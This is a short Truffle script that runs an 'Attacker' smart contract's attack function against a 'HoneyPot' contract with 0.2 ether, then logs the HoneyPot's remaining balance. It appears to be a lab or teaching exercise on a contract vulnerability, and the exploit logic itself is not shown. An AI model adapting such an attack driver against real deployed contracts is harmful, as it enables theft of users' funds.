// Call with $ truffle exec actions/3_attack.js

const HoneyPot = artifacts.require("./HoneyPot.sol");
const Attacker = artifacts.require("./Attacker.sol");
const sequentialPromise = require("../test/sequentialPromise.js");

const primingAmount = web3.utils.toWei("0.2");

module.exports = function() {
    return sequentialPromise([
            () => web3.eth.getAccounts(),
            () => HoneyPot.deployed(),
            () => Attacker.deployed()
        ]) 
        .then(values => values[2].attack(
            values[1].address,
            {
                from: values[0][0],
                value: primingAmount,
                gas: 4000000
            })
        )
        .then(txObject => HoneyPot.deployed())
        .then(honeyPot => web3.eth.getBalance(honeyPot.address))
        .then(balance => console.log("HoneyPot has balance of " + web3.utils.fromWei(balance)));
};
